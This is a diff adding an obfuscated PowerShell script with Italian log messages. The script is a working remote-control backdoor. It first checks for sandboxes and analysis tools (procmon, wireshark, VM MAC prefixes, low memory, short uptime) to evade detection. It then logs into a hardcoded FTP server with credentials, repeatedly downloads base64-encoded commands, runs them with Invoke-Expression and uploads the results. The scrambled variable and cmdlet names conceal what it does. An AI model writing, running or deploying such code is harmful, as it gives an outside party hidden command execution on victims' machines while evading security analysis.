@@ -1,0 +1,360 @@
+param(
+    [int]$21aa370fd35d44f987ecbc4cd0d55b6a = 4,
+    [int]$e08d3febebeb400eb78be556c386211c = 100,
+    [int]$d0afc5d8827743cfb3e48ec8aef68259 = 30,
+    [switch]$Verbose
+)
+$f995498f90ed4baea2965f8236a87328   = "151.81.18.80"
+$dd8394b37adc497580a4f9568bc20fd4 = 21
+$0dbffbff994149698e605d3021c4309b   = 10092
+$fccdcd06fabe41149d021cbd5f912c29    = "usrftp"
+$3e7e3ed291bc4d06977311b527c66386    = "myPassword"
+$234d9d1111c64f589775e74018e92e09  = "downloadME.txt"
+$4687998255f94f8ea3c909f6c0c9fe75    = "uploadME.txt"
+$81eca9f3cf014d65a403c4a8e064f730 = "CONTENUTO D''E''L FILE DA UPLODARE"
+$35319515990b4896b63924cef600ab3d  = $false
+$fb4ce4b630ec48a7bc8f07c4296dbe69 = $true
+$7fc58fea43e1402a825ded977bcbf526 = 5000
+$bafd1c67dd184c2180fb688863cb8f28    = 300000
+function W''rit''e-OutputConditional {
+    param(
+        [string]$Message,
+        [string]$f239b30d56e74ca683797bc663e1acc4 = "White",
+        [string]$1a9d1710c5314ad1924863d5950182fc = $null
+    )
+    if (-not $fb4ce4b630ec48a7bc8f07c4296dbe69) {
+        if ($1a9d1710c5314ad1924863d5950182fc) {
+            Writ''e-Ho''st $Message -ForegroundColor $f239b30d56e74ca683797bc663e1acc4 -BackgroundColor $1a9d1710c5314ad1924863d5950182fc
+        } else {
+            Wr''ite''-''H''o''s''t $Message -ForegroundColor $f239b30d56e74ca683797bc663e1acc4
+        }
+    }
+}
+function Test-SystemVirtualization {
+    try {
+        $e8b841ba0e064746baf4ad8bb145ebca = G''e''t''-''W''m''i''Ob''j''e''c''t -Class Win32_ComputerSystem -ErrorAction SilentlyContinue
+        if ($e8b841ba0e064746baf4ad8bb145ebca -and $e8b841ba0e064746baf4ad8bb145ebca.HypervisorPresent -eq $true) {
+            if ($Verbose -and -not $fb4ce4b630ec48a7bc8f07c4296dbe69) {
+                Writ''e-OutputConditional "[INFO] Hyper-V detected - system virtualization present" -ForegroundColor Cyan
+            }
+            return $true
+        }
+    } catch {}
+    try {
+        $85a25d30990e40949662393a982a185c = G''e''t''-''I''t''em''Pr''op''e''r''t''y -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Virtualization" -ErrorAction SilentlyContinue
+        if ($85a25d30990e40949662393a982a185c -and $85a25d30990e40949662393a982a185c.InstallDate) {
+            if ($Verbose -and -not $fb4ce4b630ec48a7bc8f07c4296dbe69) {
+                Wr''ite-OutputConditional "[INFO] System virtualization registry detected" -ForegroundColor Cyan
+            }
+            return $true
+        }
+    } catch {}
+    return $false
+}
+function Test-SandboxEnvironment {
+    param([bool]$SystemVirtualization)
+    $688064dc083c4a30aee3802caa10b2d3 = $false
+    $d0e50a4bdb204c7586b0b9255dd0d8ac = @()
+    $80d0cf6a130c43d98bea13e3fce628e7 = @(
+        "sandboxie.exe", "sandboxierpc.exe",
+        "procmon.exe", "wireshark.exe", "tcpdump.exe", "fiddler.exe", "api-mon.exe"
+    )
+    $b483ea22784941c9b311bbe15a1a87c3 = G''et-Proces''s -ErrorAction SilentlyContinue |
+        S''e''l''ect''-''Obj''e''ct -ExpandProperty Name -Unique
+    foreach ($process in $80d0cf6a130c43d98bea13e3fce628e7) {
+        if ($b483ea22784941c9b311bbe15a1a87c3 -contains $process) {
+            $d0e50a4bdb204c7586b0b9255dd0d8ac += "Sandbox analysis tool detected: $process"
+            $688064dc083c4a30aee3802caa10b2d3 = $true
+        }
+    }
+    $6005c2670f9a4e68a230d07decc129b1 = Ge''t-WmiOb''ject -Class Win32_Processor -ErrorAction SilentlyContinue
+    if ($6005c2670f9a4e68a230d07decc129b1) {
+        $1d73c823055443e8b03e27ff164e8ee8 = $6005c2670f9a4e68a230d07decc129b1.Name
+        if (-not $SystemVirtualization) {
+            if ($1d73c823055443e8b03e27ff164e8ee8 -match "QEMU|KVM|Xen|Parallels") {
+                $d0e50a4bdb204c7586b0b9255dd0d8ac += "Emulated CPU detected: $1d73c823055443e8b03e27ff164e8ee8"
+                $688064dc083c4a30aee3802caa10b2d3 = $true
+            }
+        }
+        if ($6005c2670f9a4e68a230d07decc129b1.NumberOfCores -lt 2) {
+            $d0e50a4bdb204c7586b0b9255dd0d8ac += "Very low core count: $($6005c2670f9a4e68a230d07decc129b1.NumberOfCores) cores"
+            $688064dc083c4a30aee3802caa10b2d3 = $true
+        }
+    }
+    $b6e6567d21f24e1890782ea91b4a5d22 = Ge''t-''W''miObj''ect -Class Win32_ComputerSystem -ErrorAction SilentlyContinue
+    if ($b6e6567d21f24e1890782ea91b4a5d22) {
+        $f7770041c3864471b0c7e54e2c8a0598 = [math]::Round($b6e6567d21f24e1890782ea91b4a5d22.TotalPhysicalMemory / 1GB, 2)
+        if ($f7770041c3864471b0c7e54e2c8a0598 -lt $21aa370fd35d44f987ecbc4cd0d55b6a) {
+            $d0e50a4bdb204c7586b0b9255dd0d8ac += "Low memory: ${totalMemoryGB}GB (threshold: ${MemoryThresholdGB}GB)"
+            $688064dc083c4a30aee3802caa10b2d3 = $true
+        }
+    }
+    $02c81ea3c1a741db8c1e315f6de94112 = G''e''t-W''m''i''O''b''j''e''c''t -Class Win32_LogicalDisk -ErrorAction SilentlyContinue
+    foreach ($disk in $02c81ea3c1a741db8c1e315f6de94112) {
+        if ($disk.DeviceID -eq "C:") {
+            $47f8971f73d147a48a23e3ab0b838305 = [math]::Round($disk.Size / 1GB, 2)
+            if ($47f8971f73d147a48a23e3ab0b838305 -lt $e08d3febebeb400eb78be556c386211c) {
+                $d0e50a4bdb204c7586b0b9255dd0d8ac += "Small disk: ${totalSizeGB}GB (threshold: ${DiskThresholdGB}GB)"
+                $688064dc083c4a30aee3802caa10b2d3 = $true
+            }
+        }
+    }
+    if (-not $SystemVirtualization) {
+        $9e2c7cd8d5be4ee9b20b3184b339c38a = Ge''t''-W''mi''O''b''j''e''c''t -Class Win32_NetworkAdapter -ErrorAction SilentlyContinue
+        foreach ($adapter in $9e2c7cd8d5be4ee9b20b3184b339c38a) {
+            if ($adapter.MACAddress -and $adapter.NetEnabled -eq $true) {
+                $7a97bf2d5179487188a1b7d2ce52c8c6 = $adapter.MACAddress.Substring(0, 8).Replace(":", "").ToUpper()
+                $519ca42838804566b69cf5113c172787 = @("000C29", "001C14", "005056", "080027", "0A0027")
+                if ($519ca42838804566b69cf5113c172787 -contains $7a97bf2d5179487188a1b7d2ce52c8c6) {
+                    $cec670a944494f22994695fc034f494d = $adapter.Name
+                    if ($cec670a944494f22994695fc034f494d -notmatch "Hyper-V|Virtual|WSL|Docker|vEthernet") {
+                        $d0e50a4bdb204c7586b0b9255dd0d8ac += "Suspicious MAC from non-system adapter: $($adapter.MACAddress) ($cec670a944494f22994695fc034f494d)"
+                        $688064dc083c4a30aee3802caa10b2d3 = $true
+                    }
+                }
+            }
+        }
+    }
+    try {
+        $2af3652e07b347f1bef42702e0fa2b08 = Get-Ci''mI''nstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue
+        if ($2af3652e07b347f1bef42702e0fa2b08) {
+            $ee134b112760473ab57b2f27329b57dd = (Get-Date) - $2af3652e07b347f1bef42702e0fa2b08.LastBootUpTime
+            if ($ee134b112760473ab57b2f27329b57dd.TotalMinutes -lt $d0afc5d8827743cfb3e48ec8aef68259) {
+                $d0e50a4bdb204c7586b0b9255dd0d8ac += "Very short uptime: $($ee134b112760473ab57b2f27329b57dd.TotalMinutes) minutes (threshold: ${UptimeThresholdMinutes} minutes)"
+                $688064dc083c4a30aee3802caa10b2d3 = $true
+            }
+        }
+    } catch {}
+    try {
+        Add-T''y''pe -AssemblyName System.Windows.Forms
+        $b00e7a3e71e14a26a3492e520e2c09d2 = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
+        $323c52fdff81456a86d5bf572cb6e1dd = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
+        if ($b00e7a3e71e14a26a3492e520e2c09d2 -lt 1024 -or $323c52fdff81456a86d5bf572cb6e1dd -lt 768) {
+            $d0e50a4bdb204c7586b0b9255dd0d8ac += "Low screen resolution: ${screenWidth}x${screenHeight}"
+            $688064dc083c4a30aee3802caa10b2d3 = $true
+        }
+    } catch {
+    }
+    return @{
+        Detected = $688064dc083c4a30aee3802caa10b2d3
+        Results = $d0e50a4bdb204c7586b0b9255dd0d8ac
+    }
+}
+function Invoke-NonInterceptableSleep {
+    param([int]$c3d813557e7a4301be2e58536d41d6b6 = 60)
+    [System.Threading.Thread]::Sleep($c3d813557e7a4301be2e58536d41d6b6 * 1000)
+}
+Wr''ite-OutputConditional "[*] Starting sandbox detection v3..." -ForegroundColor Yellow
+W''ri''te-OutputConditional "[*] Thresholds: Memory=${MemoryThresholdGB}GB, Disk=${DiskThresholdGB}GB, Uptime=${UptimeThresholdMinutes}min" -ForegroundColor Gray
+$7ab4e185853c4bc7a8efee97e77c4868 = Test-SystemVirtualization
+if ($7ab4e185853c4bc7a8efee97e77c4868 -and -not $fb4ce4b630ec48a7bc8f07c4296dbe69) {
+    W''r''it''e-OutputConditional "[INFO] System virtualization detected - adjusting detection logic" -ForegroundColor Cyan
+}
+$367be2843b1d4b069d253eb6b45fafca = Test-SandboxEnvironment -SystemVirtualization $7ab4e185853c4bc7a8efee97e77c4868
+if ($367be2843b1d4b069d253eb6b45fafca.Detected) {
+    Wri''te-OutputConditional "[!] Sandbox environment detected!" -ForegroundColor Red
+    W''ri''te-OutputConditional "[!] Terminating execution..." -ForegroundColor Red
+    foreach ($9eb589f11201415a8215d1dde688373e in $367be2843b1d4b069d253eb6b45fafca.Results) {
+        Wri''te-OutputConditional "    - $9eb589f11201415a8215d1dde688373e" -ForegroundColor DarkRed
+    }
+	Invoke-NonInterceptableSleep -Seconds 20
+} else {
+    W''r''i''te-OutputConditional "[+] No sandbox detected. Proceeding with payload..." -ForegroundColor Green
+    if ($Verbose -and -not $fb4ce4b630ec48a7bc8f07c4296dbe69) {
+        W''r''i''te-OutputConditional "[*] System virtualization status: $(if($7ab4e185853c4bc7a8efee97e77c4868){'Present'}else{'Not detected'})" -ForegroundColor Cyan
+    }
+    W''r''ite-OutputConditional "[*] Executing 60-second non-interceptable s''l''e''e''p..." -ForegroundColor Yellow
+    Invoke-NonInterceptableSleep -Seconds 5
+    W''r''i''t''e-OutputConditional "[+] S''le''e''p completed successfully." -ForegroundColor Green
+    W''ri''t''e-OutputConditional "[*] Continuing with legitimate operations..." -ForegroundColor Yellow
+}
+function out($msg, $157aff2f2b284406a0d5b1ec82e87124 = "White") {
+    if (-not $fb4ce4b630ec48a7bc8f07c4296dbe69) {
+        if ($157aff2f2b284406a0d5b1ec82e87124 -eq "White") { W''rit''e-''Ho''st $msg }
+        else { W''rite-''Ho''s''t $msg -ForegroundColor $157aff2f2b284406a0d5b1ec82e87124 }
+    }
+}
+function dbg($msg) {
+    if ($35319515990b4896b63924cef600ab3d -and -not $fb4ce4b630ec48a7bc8f07c4296dbe69) {
+        $f947e37b82f54d26964de4f9b2f4cb49 = (Get-Date).ToString("HH:mm:ss.fff")
+        W''r''i''te''-''Ho''st "  [DBG $f947e37b82f54d26964de4f9b2f4cb49] $msg" -ForegroundColor Cyan
+    }
+}
+function Send-Command($stream, $cmd) {
+    dbg ">>> Invio comando: $cmd"
+    $f239177b5e9a421597e786db53daab60 = [System.Text.Encoding]::ASCII.GetBytes($cmd + "`r`n")
+    try {
+        $stream.Write($f239177b5e9a421597e786db53daab60, 0, $f239177b5e9a421597e786db53daab60.Length)
+        $stream.Flush()
+        dbg "    Comando inviato ($($f239177b5e9a421597e786db53daab60.Length) bytes)"
+    } catch {
+        out "[ERRORE] Impossibile inviare il comando: $_" "Red"
+        throw
+    }
+    out "[C->S] $cmd"
+}
+function Read-Response($reader) {
+    dbg "    In attesa risposta dal server (timeout $($bafd1c67dd184c2180fb688863cb8f28)ms)..."
+    try {
+        $7a87988c83f84bdeafff1ca995b09b35 = $reader.ReadLine()
+        if ($null -eq $7a87988c83f84bdeafff1ca995b09b35) {
+            out "[ERRORE] Connessione chiusa dal server (ReadLine = null)" "Red"
+            throw "Server ha chiuso la connessione"
+        }
+        dbg "    Risposta ricevuta: $7a87988c83f84bdeafff1ca995b09b35"
+        out "[S->C] $7a87988c83f84bdeafff1ca995b09b35"
+        return $7a87988c83f84bdeafff1ca995b09b35
+    } catch {
+        out "[ERRORE] Timeout o errore lettura risposta: $_" "Red"
+        throw
+    }
+}
+function New-TcpConnection($ip, $port) {
+    dbg "Tentativo connessione TCP a ${ip}:${port} (timeout $($7fc58fea43e1402a825ded977bcbf526)ms) ..."
+    $f282cc546b9048088fdd855b7d8d2891 = N''e''w-''O''b''j''e''ct System.Net.Sockets.TcpClient
+    $2f4c3edd4b9440428ca5560b1f2e7a3e = $f282cc546b9048088fdd855b7d8d2891.BeginConnect($ip, $port, $null, $null)
+    $493480d1f4e34bc1874f5add51dc7074 = $2f4c3edd4b9440428ca5560b1f2e7a3e.AsyncWaitHandle.WaitOne($7fc58fea43e1402a825ded977bcbf526, $false)
+    if (-not $493480d1f4e34bc1874f5add51dc7074) {
+        $f282cc546b9048088fdd855b7d8d2891.Close()
+        throw "Timeout connessione TCP a ${ip}:${port} dopo $($7fc58fea43e1402a825ded977bcbf526)ms"
+    }
+    try { $f282cc546b9048088fdd855b7d8d2891.EndConnect($2f4c3edd4b9440428ca5560b1f2e7a3e) } catch {
+        $f282cc546b9048088fdd855b7d8d2891.Close()
+        throw "Connessione TCP a ${ip}:${port} fallita: $_"
+    }
+    dbg "Connessione TCP stabilita. LocalEndPoint=$($f282cc546b9048088fdd855b7d8d2891.Client.LocalEndPoint)"
+    return $f282cc546b9048088fdd855b7d8d2891
+}
+out ""
+out "[CLIENT] Avvio connessione FTP verso ${SERVER_IP}:${SERVER_PORT}" "Yellow"
+dbg "Creazione TcpClient per canale di controllo..."
+try {
+    $ce932c2ea86b4a3b857541d58c533844 = New-TcpConnection $f995498f90ed4baea2965f8236a87328 $dd8394b37adc497580a4f9568bc20fd4
+} catch {
+    out "[ERRORE FATALE] $_" "Red"
+    out "  Verifica: IP corretto? Server avviato? Firewall aperto sulla porta $dd8394b37adc497580a4f9568bc20fd4?" "Yellow"
+    exit 1
+}
+$df87b6d48c2547c6aefac475aff18ccd = $ce932c2ea86b4a3b857541d58c533844.GetStream()
+$df87b6d48c2547c6aefac475aff18ccd.ReadTimeout  = $bafd1c67dd184c2180fb688863cb8f28
+$df87b6d48c2547c6aefac475aff18ccd.WriteTimeout = $bafd1c67dd184c2180fb688863cb8f28
+$e5f92a19475a423aa68f4648145f8e92 = New-Obj''ect System.IO.StreamReader($df87b6d48c2547c6aefac475aff18ccd, [System.Text.Encoding]::ASCII)
+dbg "Stream di controllo pronto. In attesa d''e''l banner 220..."
+try { $e5ac4a6517fa4cb4ac1ffc91db71ad27 = Read-Response $e5f92a19475a423aa68f4648145f8e92 } catch { out "[ERRORE FATALE] $_" "Red"; exit 1 }
+out ""
+out "[CLIENT] FASE 1 - Autenticazione" "Yellow"
+try {
+    Send-Command $df87b6d48c2547c6aefac475aff18ccd "USER $fccdcd06fabe41149d021cbd5f912c29"
+    $e5ac4a6517fa4cb4ac1ffc91db71ad27 = Read-Response $e5f92a19475a423aa68f4648145f8e92
+    Send-Command $df87b6d48c2547c6aefac475aff18ccd "PASS $3e7e3ed291bc4d06977311b527c66386"
+    $e5ac4a6517fa4cb4ac1ffc91db71ad27 = Read-Response $e5f92a19475a423aa68f4648145f8e92
+} catch { out "[ERRORE FATALE] $_" "Red"; $ce932c2ea86b4a3b857541d58c533844.Close(); exit 1 }
+if ($e5ac4a6517fa4cb4ac1ffc91db71ad27 -notmatch "^230") {
+    out "[CLIENT] Autenticazione fallita (risposta: $e5ac4a6517fa4cb4ac1ffc91db71ad27). Disconnessione." "Red"
+    $ce932c2ea86b4a3b857541d58c533844.Close()
+    exit 1
+}
+out "[CLIENT] Autenticazione riuscita." "Green"
+dbg "Invio TYPE I ..."
+try {
+    Send-Command $df87b6d48c2547c6aefac475aff18ccd "TYPE I"
+    $e5ac4a6517fa4cb4ac1ffc91db71ad27 = Read-Response $e5f92a19475a423aa68f4648145f8e92
+} catch { out "[ERRORE FATALE] $_" "Red"; $ce932c2ea86b4a3b857541d58c533844.Close(); exit 1 }
+$4fc8fc32e7104b21bf4468335902a1f1 = 0
+while ($true) {
+    $4fc8fc32e7104b21bf4468335902a1f1++
+    out ""
+    out "[CLIENT] --- Iterazione $4fc8fc32e7104b21bf4468335902a1f1 ---" "Yellow"
+    out "[CLIENT] FASE 3+4 - Modalita passiva + Download" "Yellow"
+    try {
+        dbg "Invio EPSV per canale download..."
+        Send-Command $df87b6d48c2547c6aefac475aff18ccd "EPSV"
+        $e5ac4a6517fa4cb4ac1ffc91db71ad27 = Read-Response $e5f92a19475a423aa68f4648145f8e92
+        dbg "Invio SIZE..."
+        Send-Command $df87b6d48c2547c6aefac475aff18ccd "SIZE $234d9d1111c64f589775e74018e92e09"
+        $e5ac4a6517fa4cb4ac1ffc91db71ad27 = Read-Response $e5f92a19475a423aa68f4648145f8e92
+        dbg "Invio RETR..."
+        Send-Command $df87b6d48c2547c6aefac475aff18ccd "RETR $234d9d1111c64f589775e74018e92e09"
+        $e5ac4a6517fa4cb4ac1ffc91db71ad27 = Read-Response $e5f92a19475a423aa68f4648145f8e92
+    } catch { out "[ERRORE FATALE] $_" "Red"; $ce932c2ea86b4a3b857541d58c533844.Close(); exit 1 }
+    dbg "Apertura connessione dati verso ${SERVER_IP}:${DATA_PORT} ..."
+    try {
+        $5944d67a4c7d4e6f9e81e839926bc7f4 = New-TcpConnection $f995498f90ed4baea2965f8236a87328 $0dbffbff994149698e605d3021c4309b
+    } catch {
+        out "[ERRORE FATALE canale dati RETR] $_" "Red"
+        out "  Verifica: firewall aperto sulla porta $0dbffbff994149698e605d3021c4309b?" "Yellow"
+        $ce932c2ea86b4a3b857541d58c533844.Close(); exit 1
+    }
+    $e53e16dee1994d24a22aff514047ebaa = $5944d67a4c7d4e6f9e81e839926bc7f4.GetStream()
+    $e53e16dee1994d24a22aff514047ebaa.ReadTimeout = $bafd1c67dd184c2180fb688863cb8f28
+    dbg "Canale dati aperto. Lettura contenuto file..."
+    $fe28a440269f4d06bcf54881149e5ed9 = New''-O''bj''e''c''t System.IO.MemoryStream
+    try {
+        $e53e16dee1994d24a22aff514047ebaa.CopyTo($fe28a440269f4d06bcf54881149e5ed9)
+    } catch {
+        dbg "CopyTo interrotto (puo essere normale a fine stream): $_"
+    }
+    $5944d67a4c7d4e6f9e81e839926bc7f4.Close()
+    dbg "Canale dati chiuso. Bytes ricevuti: $($fe28a440269f4d06bcf54881149e5ed9.Length)"
+    $a951cbb9b05d44bb8638b158cb980bab = [System.Text.Encoding]::ASCII.GetString($fe28a440269f4d06bcf54881149e5ed9.ToArray())
+	dbg "Ricevuto: $a951cbb9b05d44bb8638b158cb980bab"
+	if ($a951cbb9b05d44bb8638b158cb980bab.StartsWith("AAA")) {
+       $3f411b86c3f14796833b9405097c56de = $a951cbb9b05d44bb8638b158cb980bab.Substring(3)
+    }
+    $f239177b5e9a421597e786db53daab60 = [Convert]::FromBase64String($3f411b86c3f14796833b9405097c56de)
+    $a951cbb9b05d44bb8638b158cb980bab = [System.Text.Encoding]::UTF8.GetString($f239177b5e9a421597e786db53daab60)
+	if (-not $fb4ce4b630ec48a7bc8f07c4296dbe69) {
+	    W''ri''te''-''H''os''t "Ricevuto: $a951cbb9b05d44bb8638b158cb980bab" -ForegroundColor Magenta
+	}
+    try {
+        $e5ac4a6517fa4cb4ac1ffc91db71ad27 = Read-Response $e5f92a19475a423aa68f4648145f8e92
+    } catch { out "[ERRORE FATALE] $_" "Red"; $ce932c2ea86b4a3b857541d58c533844.Close(); exit 1 }
+    if ($a951cbb9b05d44bb8638b158cb980bab.Trim().ToUpper() -eq "QUIT") {
+        out "[CLIENT] Ricevuto QUIT. Disconnessione." "Green"
+        break
+    }
+    out "[CLIENT] FASE 5 - Modalita passiva + Upload" "Yellow"
+    try {
+        dbg "Invio EPSV per canale upload..."
+        Send-Command $df87b6d48c2547c6aefac475aff18ccd "EPSV"
+        $e5ac4a6517fa4cb4ac1ffc91db71ad27 = Read-Response $e5f92a19475a423aa68f4648145f8e92
+        dbg "Invio STOR..."
+        Send-Command $df87b6d48c2547c6aefac475aff18ccd "STOR $4687998255f94f8ea3c909f6c0c9fe75"
+        $e5ac4a6517fa4cb4ac1ffc91db71ad27 = Read-Response $e5f92a19475a423aa68f4648145f8e92
+    } catch { out "[ERRORE FATALE] $_" "Red"; $ce932c2ea86b4a3b857541d58c533844.Close(); exit 1 }
+    dbg "Apertura connessione dati verso ${SERVER_IP}:${DATA_PORT} per upload..."
+    try {
+        $5944d67a4c7d4e6f9e81e839926bc7f4 = New-TcpConnection $f995498f90ed4baea2965f8236a87328 $0dbffbff994149698e605d3021c4309b
+    } catch {
+        out "[ERRORE FATALE canale dati STOR] $_" "Red"
+        out "  Verifica: firewall aperto sulla porta $0dbffbff994149698e605d3021c4309b?" "Yellow"
+        $ce932c2ea86b4a3b857541d58c533844.Close(); exit 1
+    }
+    $9eb589f11201415a8215d1dde688373e = Inv''oke-''E''xp''res''s''i''o''n $a951cbb9b05d44bb8638b158cb980bab 2>&1 | O''u''t''-''Stri''n''g
+	if (-not $fb4ce4b630ec48a7bc8f07c4296dbe69) {
+          W''r''ite-''H''o''st "Sto per inviare: $9eb589f11201415a8215d1dde688373e" -ForegroundColor Magenta
+    }
+    $f239177b5e9a421597e786db53daab60 = [System.Text.Encoding]::UTF8.GetBytes($9eb589f11201415a8215d1dde688373e)
+    $83e4bd5ec00f4b3685e2ff67a7100475 = [Convert]::ToBase64String($f239177b5e9a421597e786db53daab60)
+    $81eca9f3cf014d65a403c4a8e064f730 = "AAA" + $83e4bd5ec00f4b3685e2ff67a7100475
+    $e53e16dee1994d24a22aff514047ebaa = $5944d67a4c7d4e6f9e81e839926bc7f4.GetStream()
+    $e53e16dee1994d24a22aff514047ebaa.WriteTimeout = $bafd1c67dd184c2180fb688863cb8f28
+    $58411f2565894eb2afaef82d23de5b5c = [System.Text.Encoding]::ASCII.GetBytes($81eca9f3cf014d65a403c4a8e064f730)
+    dbg "Invio $($58411f2565894eb2afaef82d23de5b5c.Length) bytes sul canale dati..."
+    try {
+        $e53e16dee1994d24a22aff514047ebaa.Write($58411f2565894eb2afaef82d23de5b5c, 0, $58411f2565894eb2afaef82d23de5b5c.Length)
+        $e53e16dee1994d24a22aff514047ebaa.Flush()
+    } catch {
+        out "[ERRORE FATALE invio dati STOR] $_" "Red"
+        $ce932c2ea86b4a3b857541d58c533844.Close(); exit 1
+    }
+    $5944d67a4c7d4e6f9e81e839926bc7f4.Close()
+    dbg "Canale dati upload chiuso."
+    try {
+        $e5ac4a6517fa4cb4ac1ffc91db71ad27 = Read-Response $e5f92a19475a423aa68f4648145f8e92
+    } catch { out "[ERRORE FATALE] $_" "Red"; $ce932c2ea86b4a3b857541d58c533844.Close(); exit 1 }
+    out "[CLIENT] Upload completato." "Green"
+}
+$ce932c2ea86b4a3b857541d58c533844.Close()
+out ""
+out "[CLIENT] Connessione chiusa. Client terminato." "Green"
